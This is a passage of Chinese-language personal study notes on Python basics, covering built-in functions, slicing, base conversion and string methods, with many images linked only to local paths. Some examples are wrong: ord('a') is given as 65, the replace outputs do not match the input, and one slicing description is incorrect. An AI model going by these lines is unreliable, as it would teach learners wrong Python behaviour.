获取文件系统使用编码方式，Windows下返回&#39;mbcs&#39;，mac下返回&#39;utf-8&#39;.</span><br><span class=\"line\"></span><br><span class=\"line\">sys.path: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</span><br><span class=\"line\"></span><br><span class=\"line\">sys.platform: 获取当前系统平台。</span><br><span class=\"line\"></span><br><span class=\"line\">sys.stdin,sys.stdout,sys.stderr: stdin , stdout , 以及stderr 变量包含与标准I&#x2F;O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</span><br></pre></td></tr></table></figure>\n<h3 id=\"实用函数内建函数\"><a class=\"markdownIt-Anchor\" href=\"#实用函数内建函数\">#</a> <strong>实用函数（内建函数）</strong></h3>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107141353584.png\" alt=\"image-20201107141353584\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PS：常用内置模块函数:</span><br><span class=\"line\">abs(x)                    返回x的绝对值</span><br><span class=\"line\">apply(func[,args[,kwargs]])        把函数的参数放置在序列中传入函数</span><br><span class=\"line\">bool([x])                把每一个值或者表达式转换为bool类型，如果表达式x为值，则返回True,否则返回False</span><br><span class=\"line\">cmp(x,y)                比较x,y的大小</span><br><span class=\"line\">delattr(obj,name)            等价于del obj.name</span><br><span class=\"line\">eval(s[,globals[,locals]])        计算表达式的值</span><br><span class=\"line\">float(x)                把数字或者字符串转换成float类型数据</span><br><span class=\"line\">hash(object)                返回一个对象的hash值</span><br><span class=\"line\">help([object])                返回内联函数的帮助说明</span><br><span class=\"line\">id(x)                    返回一个对象的标示</span><br><span class=\"line\">input([prompt])                接受控制台的输入，并把输入的值转换成数字</span><br><span class=\"line\">int(x)                    把数字或字符串转换为整型</span><br><span class=\"line\">len(obj)                对象包含的元素的个数</span><br><span class=\"line\">range([start,]end[,step])        生产一个列表并返回</span><br><span class=\"line\">raw_input([prompt])            接受控制台的输入，返回字符串类型</span><br><span class=\"line\">reduce(func,sequence[,initial])        对序列的值进行累加计算</span><br><span class=\"line\">round(x,n&#x3D;0)                四舍五入的函数</span><br><span class=\"line\">set([interable])            返回一个set集合</span><br><span class=\"line\">sorted(iterable[,cmp[,key[,reverse]]])    返回一个排序后的列表</span><br><span class=\"line\">sum(iterable[,start&#x3D;0])            返回一个序列的和</span><br><span class=\"line\">type(obj)                返回一个对象的类型</span><br><span class=\"line\">xrange(start[,end[,step]])        功能和range()类似，但是一次返回一个值</span><br><span class=\"line\">zip(seq1[,seq2,…])            把n个序列作为列表的元素返回</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、apply()：可以调用可变参数列表的函数，把参数存在一个元组或者序列中，apply元组参数必须和sum()的参数一致</span><br><span class=\"line\"></span><br><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class=\"line\"># -*- coding:utf8 -*-</span><br><span class=\"line\">def sum(x&#x3D;1,y&#x3D;2):</span><br><span class=\"line\">  return x+y</span><br><span class=\"line\">  </span><br><span class=\"line\">print apply(sum,(1,3))  &#x3D;&gt;  4</span><br></pre></td></tr></table></figure>\n<p><strong>1、假设是执行没有带参数的方法：</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107170811837.png\" alt=\"image-20201107170811837\"></strong></p>\n<p><strong>2、函数只带元组的参数：</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107171030264.png\" alt=\"image-20201107171030264\"></strong></p>\n<p><strong>3、函数带关键字参数：</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107171518321.png\" alt=\"image-20201107171518321\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2、filter()：可以对某个序列进行过滤，其中过滤的func()参数不能为空.</span><br><span class=\"line\">filter(func or None,sequence) –&gt;list,tuple,or string</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107173311723.png\" alt=\"image-20201107173311723\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reduce() 函数会对参数序列中元素进行累积。</span><br><span class=\"line\">函数将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107174224007.png\" alt=\"image-20201107174224007\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107180053532.png\" alt=\"image-20201107180053532\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4、map()：可以对多个序列的每个元素都执行相同的操作，并组成列表返回。</span><br><span class=\"line\">如果提供多个序列，则每个序列中的元素一一对应进行计算；如果每个序列的长度不相同，</span><br><span class=\"line\">则短的序列后补充“None”,再进行计算</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107180555241.png\" alt=\"image-20201107180555241\"></strong></p>\n<h2 id=\"语句和语法\"><a class=\"markdownIt-Anchor\" href=\"#语句和语法\">#</a> <strong>语句和语法</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107151556112.png\" alt=\"image-20201107151556112\"></strong></p>\n<p><strong>；语句（直接输入在一行）</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107151627702.png\" alt=\"image-20201107151627702\"></strong></p>\n<p><strong>多元赋值</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107151814776.png\" alt=\"image-20201107151814776\"></strong></p>\n<h2 id=\"python-关键字\"><a class=\"markdownIt-Anchor\" href=\"#python-关键字\">#</a> <strong>python 关键字</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107151910582.png\" alt=\"image-20201107151910582\"></strong></p>\n<p><strong>模块文档</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107152400729.png\" alt=\"image-20201107152400729\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">主程序</span><br><span class=\"line\">if name &#x3D;&#x3D; ‘main‘的意思是：当.py文件被直接运行时，if name &#x3D;&#x3D; ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name &#x3D;&#x3D; ‘main‘之下的代码块不被运行。</span><br></pre></td></tr></table></figure>\n<p><strong>del 语句</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__&#x3D;&#x3D;&#39;__main__&#39;:  </span><br><span class=\"line\">    a&#x3D;1       # 对象 1 被 变量a引用，对象1的引用计数器为1  </span><br><span class=\"line\">    b&#x3D;a       # 对象1 被变量b引用，对象1的引用计数器加1  </span><br><span class=\"line\">    c&#x3D;a       #1对象1 被变量c引用，对象1的引用计数器加1  </span><br><span class=\"line\">    del a     #删除变量a，解除a对1的引用  </span><br><span class=\"line\">    del b     #删除变量b，解除b对1的引用  </span><br><span class=\"line\">    print(c)  #最终变量c仍然引用1  </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">del删除的是变量，而不是数据。</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__&#x3D;&#x3D;&#39;__main__&#39;:  </span><br><span class=\"line\">    li&#x3D;[1,2,3,4,5]  #列表本身不包含数据1,2,3,4,5，而是包含变量：li[0] li[1] li[2] li[3] li[4]   </span><br><span class=\"line\">    first&#x3D;li[0]     #拷贝列表，也不会有数据对象的复制，而是创建新的变量引用  </span><br><span class=\"line\">    del li[0]  </span><br><span class=\"line\">    print(li)      #输出[2, 3, 4, 5]  </span><br><span class=\"line\">    print(first)   #输出 1  </span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107153700939.png\" alt=\"image-20201107153700939\"></strong></p>\n<h2 id=\"切片\"><a class=\"markdownIt-Anchor\" href=\"#切片\">#</a> <strong>切片</strong></h2>\n<p><strong>切分 split ()  把字符串以某种字符为分隔符进行切分</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*.split() 以空格为分隔符切片</span><br><span class=\"line\">print str.split(&#39; &#39;, 1 ); # 以空格为分隔符，分隔成两个</span><br><span class=\"line\">*.split(&#39;,&#39;) 以，为分隔符切片</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107164910592.png\" alt=\"image-20201107164910592\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foolist[::-1]  翻转</span><br><span class=\"line\">foostr[::2] \t隔一个取一个的操作</span><br><span class=\"line\">foostr[::3]\t\t隔两个取两个的操作</span><br><span class=\"line\">foostr[2::]     截掉前两个取后面</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107153937933.png\" alt=\"image-20201107153937933\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107181908777.png\" alt=\"image-20201107181908777\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s[:]    切片s</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107182537467.png\" alt=\"image-20201107182537467\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107182452238.png\" alt=\"image-20201107182452238\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107154219008.png\" alt=\"image-20201107154219008\"></strong></p>\n<h2 id=\"布尔类型\"><a class=\"markdownIt-Anchor\" href=\"#布尔类型\">#</a> <strong>布尔类型</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">布尔逻辑操作符 and、or和 not 都是 Python 关键字，这些操作符的优先级按从高到低的顺序列于表 4.3。</span><br><span class=\"line\">not 操作符拥有最高优先级，只比所有比较操作符低一级。and 和 or 操作符则相应地再低一级</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107154354375.png\" alt=\"image-20201107154354375\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107154530298.png\" alt=\"image-20201107154530298\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107154915248.png\" alt=\"image-20201107154915248\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmp(obj1,obj2)将两数比较</span><br><span class=\"line\">repr() 函数将对象转化为供解释器读取的形式。</span><br><span class=\"line\">repr(object)</span><br><span class=\"line\">type(obj)返回类型</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107155044932.png\" alt=\"image-20201107155044932\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107155805451.png\" alt=\"image-20201107155805451\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107160128104.png\" alt=\"image-20201107160128104\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107160227570.png\" alt=\"image-20201107160227570\"></strong></p>\n<h2 id=\"和\"><a class=\"markdownIt-Anchor\" href=\"#和\">#</a> <strong>/ 和 //</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107160953628.png\" alt=\"image-20201107160953628\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; &#x2F; &quot;就一定表示 浮点数除法，返回浮点结果;&quot; &#x2F;&#x2F; &quot;表示整数除法</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107161431782.png\" alt=\"image-20201107161431782\"></strong></p>\n<h2 id=\"数值工厂函数\"><a class=\"markdownIt-Anchor\" href=\"#数值工厂函数\">#</a> <strong>数值工厂函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107161959650.png\" alt=\"image-20201107161959650\"></strong></p>\n<h2 id=\"功能函数\"><a class=\"markdownIt-Anchor\" href=\"#功能函数\">#</a> <strong>功能函数</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">abs()返回给定参数的绝对值</span><br><span class=\"line\">函数 coerce()，尽管从技术上讲它是一个数据类型转换函数</span><br><span class=\"line\">divmod()内建函数把除法和取余运算结合起来，返回一个包含商和余数的元组</span><br><span class=\"line\">函数 pow() 和双星号 （**） 操作符都可以进行指数运算</span><br><span class=\"line\">内建函数 round()用于对浮点型进行四舍五入运算</span><br></pre></td></tr></table></figure>\n<h2 id=\"进制转换函数\"><a class=\"markdownIt-Anchor\" href=\"#进制转换函数\">#</a> <strong>进制转换函数</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bin()函数，是将十进制的数字转换成二进制的数字。</span><br><span class=\"line\">oct()函数，是将十进制的数字转换成八进制的数字。</span><br><span class=\"line\">int()函数，是将其他进制的数字转换成十进制的数字。</span><br><span class=\"line\">hex()函数就是将十进制的数字转换成十六进制的数字。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(bin(10))</span><br><span class=\"line\"># &#39;0b1010&#39; 0b就代表二进制数</span><br><span class=\"line\">十进制转八进制oct()</span><br><span class=\"line\">print(oct(10))</span><br><span class=\"line\"># &#39;0o12&#39; 0o就代表八进制数</span><br><span class=\"line\">十进制转十六进制hex()</span><br><span class=\"line\">print(hex(10))</span><br><span class=\"line\"># &#39;0xa&#39; 0x就代表十六进制数</span><br><span class=\"line\">其他进制转十进制int(其他进制数字符串，进制)</span><br><span class=\"line\"># 二进制转十进制</span><br><span class=\"line\">print(int(&#39;0b1010&#39;, 2))</span><br><span class=\"line\"># 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 八进制转十进制</span><br><span class=\"line\">print(int(&#39;0o12&#39;, 8))</span><br><span class=\"line\"># 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 十六进制转十进制</span><br><span class=\"line\">print(int(&#39;0xa&#39;, 16))</span><br><span class=\"line\"># 10</span><br></pre></td></tr></table></figure>\n<h2 id=\"ascii转换函数\"><a class=\"markdownIt-Anchor\" href=\"#ascii转换函数\">#</a> <strong>ASCII 转换函数</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ord(&#39;a&#39;) &#x3D;&gt; 65</span><br><span class=\"line\">chr(65)  &#x3D;&gt; a</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107165645096.png\" alt=\"image-20201107165645096\"></strong></p>\n<h2 id=\"相关模块\"><a class=\"markdownIt-Anchor\" href=\"#相关模块\">#</a> <strong>相关模块</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107181101383.png\" alt=\"image-20201107181101383\"></strong></p>\n<p><strong>!(E:\\typora 笔记 \\typora-user-images\\image-20201107181025707.png)</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107181041608.png\" alt=\"image-20201107181041608\"></strong></p>\n<h2 id=\"类型转换\"><a class=\"markdownIt-Anchor\" href=\"#类型转换\">#</a> <strong>类型转换</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107182941051.png\" alt=\"image-20201107182941051\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201107182802039.png\" alt=\"image-20201107182802039\"></strong></p>\n<p><strong>string 模块</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108134604160.png\" alt=\"image-20201108134604160\"></strong></p>\n<h2 id=\"字符串符号\"><a class=\"markdownIt-Anchor\" href=\"#字符串符号\">#</a> <strong>字符串符号</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108140449734.png\" alt=\"image-20201108140449734\"></strong></p>\n<h2 id=\"格式化操作符辅助指令\"><a class=\"markdownIt-Anchor\" href=\"#格式化操作符辅助指令\">#</a> <strong>格式化操作符辅助指令</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108140616882.png\" alt=\"image-20201108140616882\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108140623536.png\" alt=\"image-20201108140623536\"></strong></p>\n<p><strong>十六进制输出</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108140847577.png\" alt=\"image-20201108140847577\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108141109107.png\" alt=\"image-20201108141109107\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108141200464.png\" alt=\"image-20201108141200464\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">除了原始字符串符号（引号前面的字母“r”）以外，原始字符串跟普通字符串有着几乎完全相同的</span><br><span class=\"line\">语法。这个&#39;r&#39;可以是小写也可以是大写，唯一的要求是必须紧靠在第一个引号前。在 3 个例子的第 1 个</span><br><span class=\"line\">例子里面，我们需要一个反斜杠加一个“n”来而不是一个换行符。</span><br></pre></td></tr></table></figure>\n<p><strong>如：</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108141427883.png\" alt=\"image-20201108141427883\"></strong></p>\n<h2 id=\"enumerate\"><a class=\"markdownIt-Anchor\" href=\"#enumerate\">#</a> <strong>enumerate()</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108141710055.png\" alt=\"image-20201108141710055\"></strong></p>\n<h2 id=\"zip\"><a class=\"markdownIt-Anchor\" href=\"#zip\">#</a> <strong>zip()</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108141851933.png\" alt=\"image-20201108141851933\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sorted() 排序</span><br><span class=\"line\">sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</span><br><span class=\"line\"></span><br><span class=\"line\">list 的 sort 方法返回的是对已经存在的列表进行操作，而内建函数 sorted 方法返回的是一个新的 list，而不是在原来的基础上进行的</span><br><span class=\"line\">操作。</span><br></pre></td></tr></table></figure>\n<h2 id=\"reversed\"><a class=\"markdownIt-Anchor\" href=\"#reversed\">#</a> <strong>reversed</strong></h2>\n<p><strong>reversed 函数返回一个反转的迭代器。</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class=\"line\"> </span><br><span class=\"line\"># 字符串</span><br><span class=\"line\">seqString &#x3D; &#39;Runoob&#39;</span><br><span class=\"line\">print(list(reversed(seqString)))</span><br><span class=\"line\"> </span><br><span class=\"line\"># 元组</span><br><span class=\"line\">seqTuple &#x3D; (&#39;R&#39;, &#39;u&#39;, &#39;n&#39;, &#39;o&#39;, &#39;o&#39;, &#39;b&#39;)</span><br><span class=\"line\">print(list(reversed(seqTuple)))</span><br><span class=\"line\"> </span><br><span class=\"line\"># range</span><br><span class=\"line\">seqRange &#x3D; range(5, 9)</span><br><span class=\"line\">print(list(reversed(seqRange)))</span><br><span class=\"line\"> </span><br><span class=\"line\"># 列表</span><br><span class=\"line\">seqList &#x3D; [1, 2, 4, 3, 5]</span><br><span class=\"line\">print(list(reversed(seqList)))</span><br></pre></td></tr></table></figure>\n<h2 id=\"元组-2\"><a class=\"markdownIt-Anchor\" href=\"#元组-2\">#</a> <strong>元组</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">元组使用小括号，列表使用方括号。</span><br><span class=\"line\">Python的元组与列表类似，不同之处在于元组的元素不能修改。</span><br><span class=\"line\">元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</span><br><span class=\"line\">tup1 &#x3D; (&#39;physics&#39;, &#39;chemistry&#39;, 1997, 2000)</span><br><span class=\"line\">tup2 &#x3D; (1, 2, 3, 4, 5, 6, 7 )</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108145756189.png\" alt=\"image-20201108145756189\"></strong></p>\n<h2 id=\"列表类型内建函数\"><a class=\"markdownIt-Anchor\" href=\"#列表类型内建函数\">#</a> <strong>列表类型内建函数</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108145843902.png\" alt=\"image-20201108145843902\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108145952617.png\" alt=\"image-20201108145952617\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108150033419.png\" alt=\"image-20201108150033419\"></strong></p>\n<h2 id=\"字符串内建函数\"><a class=\"markdownIt-Anchor\" href=\"#字符串内建函数\">#</a> <strong>字符串内建函数</strong></h2>\n<p><strong>str_replace</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">把 将字符串中的 str1 替换成 str2,如果 max 指定，则替换不超过 max 次：replace(old, new [, max])</span><br><span class=\"line\">str&#x3D;(&#39;Hello world&#39;)</span><br><span class=\"line\">print (str.replace(&#39;Hello&#39;,&#39;hi&#39;)) #hi hi,World</span><br><span class=\"line\">print (str.replace(&#39;Hello&#39;,&#39;hi&#39;,1)) #hi Hello,World</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108143535599.png\" alt=\"image-20201108143535599\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201108143549985.png\" alt=\"image-20201108143549985\"></strong></p>\n<p><strong><img 